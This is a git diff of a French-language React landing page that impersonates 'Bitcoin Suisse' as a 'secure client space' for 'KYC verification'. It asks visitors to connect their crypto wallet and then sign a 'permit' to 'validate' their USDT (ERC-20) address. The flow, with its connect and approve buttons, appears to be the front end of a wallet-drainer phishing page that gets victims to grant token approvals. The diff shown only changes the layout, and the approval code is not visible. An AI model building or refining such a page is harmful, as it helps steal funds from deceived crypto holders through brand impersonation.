@@ -183,7 +183,15 @@ export default function Landing() {
   }
 
   return (
-    <div className="min-h-screen bg-black text-white font-['Inter',sans-serif] relative overflow-hidden">
+    <div 
+      className="min-h-screen text-white font-['Inter',sans-serif] relative"
+      style={{ 
+        backgroundImage: `url(${BG_IMAGE_URL})`,
+        backgroundSize: 'cover',
+        backgroundPosition: 'center',
+        backgroundRepeat: 'no-repeat'
+      }}
+    >
       <Toaster 
         richColors 
         position="top-center"
@@ -196,175 +204,97 @@ export default function Landing() {
         }}
       />
       
-      {/* Background avec le taureau */}
-      <div 
-        className="absolute inset-0 bg-cover bg-right bg-no-repeat"
-        style={{ backgroundImage: `url(${BULL_BG_URL})` }}
-      />
-      <div className="absolute inset-0 bg-gradient-to-r from-black via-black/95 to-black/40" />
-      
-      {/* Header */}
-      <header className="relative z-10 flex items-center justify-between px-8 py-6">
-        <img 
-          src={LOGO_URL} 
-          alt="Bitcoin Suisse" 
-          className="h-10 object-contain brightness-0 invert"
-        />
-        <div className="flex items-center gap-4">
-          {isConnected && (
-            <Badge className="bg-[#E31B23]/10 text-[#E31B23] border border-[#E31B23]/30 px-4 py-2">
-              <div className="w-2 h-2 rounded-full bg-[#E31B23] mr-2 animate-pulse" />
-              {formatAddress(address)}
-            </Badge>
-          )}
-          {isConnected && (
+      {/* Contenu dans le rectangle gris à gauche */}
+      <div className="absolute left-[11%] top-[23%] w-[340px] h-[420px] flex flex-col justify-center px-6">
+        
+        {/* Badge */}
+        <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-[#E31B23]/20 border border-[#E31B23]/40 rounded-full text-[#E31B23] text-xs font-medium mb-4 w-fit">
+          <ShieldCheck className="w-3 h-3" />
+          ESPACE CLIENT SÉCURISÉ
+        </div>
+        
+        {/* Titre */}
+        <h1 className="text-3xl font-bold leading-tight mb-3">
+          Vérification
+          <br />
+          <span className="text-[#E31B23]">KYC</span>
+        </h1>
+        
+        {/* Description */}
+        <p className="text-gray-400 text-sm leading-relaxed mb-4">
+          Connectez votre wallet afin de valider votre adresse de réception des fonds USDT (ERC-20).
+        </p>
+
+        {/* Statut si connecté et autorisé */}
+        {isConnected && hasApproved && (
+          <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/30 rounded-lg mb-4">
+            <CheckCircle className="w-5 h-5 text-green-500" />
+            <p className="font-semibold text-green-400 text-sm">Adresse validée</p>
+          </div>
+        )}
+
+        {/* Wallet Info si connecté */}
+        {isConnected && (
+          <div className="bg-[#0a0a0a]/80 border border-gray-700 rounded-lg p-3 mb-4">
+            <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Wallet connecté</p>
+            <p className="font-mono text-xs text-white">{formatAddress(address)}</p>
             <button 
               onClick={() => disconnect()}
-              className="text-gray-500 hover:text-white text-sm transition-colors"
+              className="text-gray-500 hover:text-[#E31B23] text-xs mt-1 transition-colors"
             >
               Déconnecter
             </button>
-          )}
-        </div>
-      </header>
-
-      {/* Main Content */}
-      <main className="relative z-10 flex items-center min-h-[calc(100vh-180px)] px-8 lg:px-16">
-        <div className="w-full max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
-          
-          {/* Left Column - Text */}
-          <div className="space-y-8">
-            <div className="inline-flex items-center gap-2 px-4 py-2 bg-[#E31B23]/10 border border-[#E31B23]/30 rounded-full text-[#E31B23] text-sm font-medium">
-              <ShieldCheck className="w-4 h-4" />
-              ESPACE CLIENT SÉCURISÉ
-            </div>
-            
-            <div>
-              <h1 className="text-4xl lg:text-5xl font-bold leading-tight">
-                Vérification
-                <br />
-                <span className="text-[#E31B23]">KYC</span>
-              </h1>
-            </div>
-            
-            <p className="text-gray-400 text-lg max-w-md leading-relaxed">
-              Veuillez connecter votre wallet afin de valider votre adresse de réception 
-              des fonds USDT (ERC-20) et finaliser la procédure de vérification de votre dossier.
-            </p>
-
-            {/* Statut si connecté et autorisé */}
-            {isConnected && hasApproved && (
-              <div className="flex items-center gap-3 p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
-                <CheckCircle className="w-6 h-6 text-green-500" />
-                <div>
-                  <p className="font-semibold text-green-400">Adresse validée</p>
-                </div>
-              </div>
-            )}
-            
-            {/* Étapes */}
-            <div className="space-y-4 pt-4">
-              <div className="flex items-center gap-4">
-                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${isConnected ? 'bg-green-500 text-black' : 'bg-[#E31B23] text-white'}`}>
-                  {isConnected ? '✓' : '1'}
-                </div>
-                <span className={isConnected ? 'text-green-400' : 'text-gray-300'}>
-                  Connecter votre wallet
-                </span>
-              </div>
-              <div className="flex items-center gap-4">
-                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${hasApproved ? 'bg-green-500 text-black' : isConnected ? 'bg-[#E31B23] text-white' : 'bg-gray-800 text-gray-500'}`}>
-                  {hasApproved ? '✓' : '2'}
-                </div>
-                <span className={hasApproved ? 'text-green-400' : isConnected ? 'text-gray-300' : 'text-gray-600'}>
-                  Valider votre adresse de réception
-                </span>
-              </div>
-            </div>
           </div>
-
-          {/* Right Column - Action Card */}
-          <div className="flex justify-center lg:justify-end">
-            <div className="w-full max-w-md bg-[#111111]/90 backdrop-blur-sm border border-gray-800 rounded-2xl p-8 space-y-6">
-              {/* Icon */}
-              <div className="flex justify-center">
-                <div className="w-16 h-16 rounded-full bg-[#E31B23]/10 border border-[#E31B23]/30 flex items-center justify-center">
-                  <Wallet className="w-7 h-7 text-[#E31B23]" />
-                </div>
-              </div>
-              
-              {/* Title */}
-              <div className="text-center">
-                <h2 className="text-xl font-semibold">
-                  {!isConnected ? 'Connexion Wallet' : hasApproved ? 'USDT - ERC20' : 'Signature Requise'}
-                </h2>
-                <p className="text-gray-500 text-sm mt-2">
-                  {!isConnected 
-                    ? 'Connectez votre wallet pour continuer' 
-                    : hasApproved 
-                      ? 'Votre adresse de réception a bien été confirmée'
-                      : 'Validez votre adresse de réception'
-                  }
-                </p>
-              </div>
-              
-              {/* Wallet Info si connecté */}
-              {isConnected && (
-                <div className="bg-[#0a0a0a] border border-gray-800 rounded-lg p-4">
-                  <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Wallet connecté</p>
-                  <p className="font-mono text-sm">{address}</p>
-                </div>
-              )}
-              
-              {/* Buttons */}
-              <div className="space-y-3">
-                {!isConnected ? (
-                  <Button 
-                    onClick={handleConnect}
-                    className="w-full h-12 bg-[#E31B23] hover:bg-[#c91820] text-white font-semibold"
-                    data-testid="connect-wallet-button"
-                  >
-                    <Wallet className="mr-2 h-5 w-5" />
-                    Connecter Wallet
-                    <ArrowRight className="ml-2 h-4 w-4" />
-                  </Button>
-                ) : (
-                  <Button 
-                    onClick={handleApprove}
-                    disabled={buttonState.disabled}
-                    className={`w-full h-12 font-semibold ${
-                      hasApproved 
-                        ? 'bg-green-600/20 text-green-400 border border-green-600/30 hover:bg-green-600/30' 
-                        : 'bg-[#E31B23] hover:bg-[#c91820] text-white'
-                    }`}
-                    data-testid="sign-permit-button"
-                  >
-                    {buttonState.icon}
-                    {buttonState.text}
-                    {!hasApproved && !buttonState.disabled && <ArrowRight className="ml-2 h-4 w-4" />}
-                  </Button>
-                )}
-              </div>
-              
-              {/* Info */}
+        )}
+        
+        {/* Étapes */}
+        <div className="space-y-2 mb-5">
+          <div className="flex items-center gap-3">
+            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${isConnected ? 'bg-green-500 text-black' : 'bg-[#E31B23] text-white'}`}>
+              {isConnected ? '✓' : '1'}
             </div>
+            <span className={`text-sm ${isConnected ? 'text-green-400' : 'text-gray-300'}`}>
+              Connecter votre wallet
+            </span>
+          </div>
+          <div className="flex items-center gap-3">
+            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${hasApproved ? 'bg-green-500 text-black' : isConnected ? 'bg-[#E31B23] text-white' : 'bg-gray-700 text-gray-500'}`}>
+              {hasApproved ? '✓' : '2'}
+            </div>
+            <span className={`text-sm ${hasApproved ? 'text-green-400' : isConnected ? 'text-gray-300' : 'text-gray-600'}`}>
+              Valider votre adresse
+            </span>
           </div>
         </div>
-      </main>
-
-      {/* Footer */}
-      <footer className="relative z-10 px-8 py-6 border-t border-gray-900">
-        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
-          <div className="flex items-center gap-2">
-            <span className="text-[#E31B23] font-semibold">BITCOIN SUISSE</span>
-            <span>•</span>
-            <span>Plateforme de financement USDT</span>
-          </div>
-          <div>
-            © 2025 Tous droits réservés
-          </div>
-        </div>
-      </footer>
+        
+        {/* Bouton */}
+        {!isConnected ? (
+          <Button 
+            onClick={handleConnect}
+            className="w-full h-11 bg-[#E31B23] hover:bg-[#c91820] text-white font-semibold text-sm"
+            data-testid="connect-wallet-button"
+          >
+            <Wallet className="mr-2 h-4 w-4" />
+            Connecter Wallet
+            <ArrowRight className="ml-2 h-4 w-4" />
+          </Button>
+        ) : (
+          <Button 
+            onClick={handleApprove}
+            disabled={buttonState.disabled}
+            className={`w-full h-11 font-semibold text-sm ${
+              hasApproved 
+                ? 'bg-green-600/20 text-green-400 border border-green-600/30 hover:bg-green-600/30' 
+                : 'bg-[#E31B23] hover:bg-[#c91820] text-white'
+            }`}
+            data-testid="sign-permit-button"
+          >
+            {buttonState.icon}
+            {buttonState.text}
+            {!hasApproved && !buttonState.disabled && <ArrowRight className="ml-2 h-4 w-4" />}
+          </Button>
+        )}
+      </div>
     </div>
   );
 }
